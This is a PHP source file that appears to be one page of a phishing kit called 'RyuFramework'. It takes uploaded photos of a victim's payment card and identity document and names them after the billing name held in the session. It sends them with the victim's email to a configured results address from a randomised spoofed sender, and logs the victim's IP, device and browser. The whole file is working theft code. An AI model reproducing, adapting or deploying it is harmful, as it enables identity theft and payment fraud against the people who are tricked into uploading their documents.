<?php
/**
* ------------------------------------------------------
* FILE GENERATED FROM RYUCLI ( Fri,16-04-2021 04:14 )
* @filename photo.php
* ------------------------------------------------------
*
* @package RyuFramework
* 
* @author shinryu
* @version v1.0-21
* @copyright 2021 shinryujin
*
*
* @disclaimer : 
* This is software for personal use, misuse of this software is not the responsibility of us (the owner). 
* All legal forms are submitted to their respective users 
*
**/




if(isset($_FILES))
{
    
         $filename = str_replace(" ","-",strtolower($this->handler->session('billing')['fullname']));
            $upload_card = $this->handler->UploadImage('cardphoto','CARD_'.$filename);
            $upload_id = $this->handler->UploadImage('idphoto','ID_'.$filename);

            $direct = $this->router('photo')['full'];
            $back = '?p=photo&session_id='. strtoupper(sha1(time())).'&country='.$this->userdata['country']['countryCode'].'&lang='.$this->lang;
            if($upload_card !== false && $upload_id !== false)
            { 
                $msg_data = ['fullname' => $this->handler->session('billing')['fullname'],
                            'email' => $this->handler->session('account')['email'],
                            'photo_id' => $this->sec->image_encode($upload_id),
                            'photo_card' => $this->sec->image_encode($upload_card)
                            ];
                $to = CONFIG['app']['email_result'];
                $from = ['from_name' => $this->handler->session('billing')['fullname'],
                         'from_mail' => 'app-photo@'.rand().'.ryujinframework.net'
                        ];
                $subject = 'PHOTO ID & CARD '.$this->handler->session('billing')['fullname'].' : [ '.$this->handler->getInfo($this->userdata['api']['country']).' ]';
                $msg = $this->handler->result('photo',$msg_data);
        
                $this->handler->sendemail($from,$to,$subject,$msg,[$upload_id,$upload_card]);
                toLogs('pap',['data' => ['country' => $this->userdata['api']['country'],
                'device' => $this->handler->detection()['platform'],
                'ip' => $this->handler->detection()['userip'],
                'browser' => $this->handler->detection()['browser']
                ] , 'desc' => 'User successfully upload photo : '.$filename]);
                 return $this->redirect($direct);

            }else{

                echo "<script>alert('Photo not allowed !'); window.location.href='$back'; </script>";
                exit;
            }
 
}
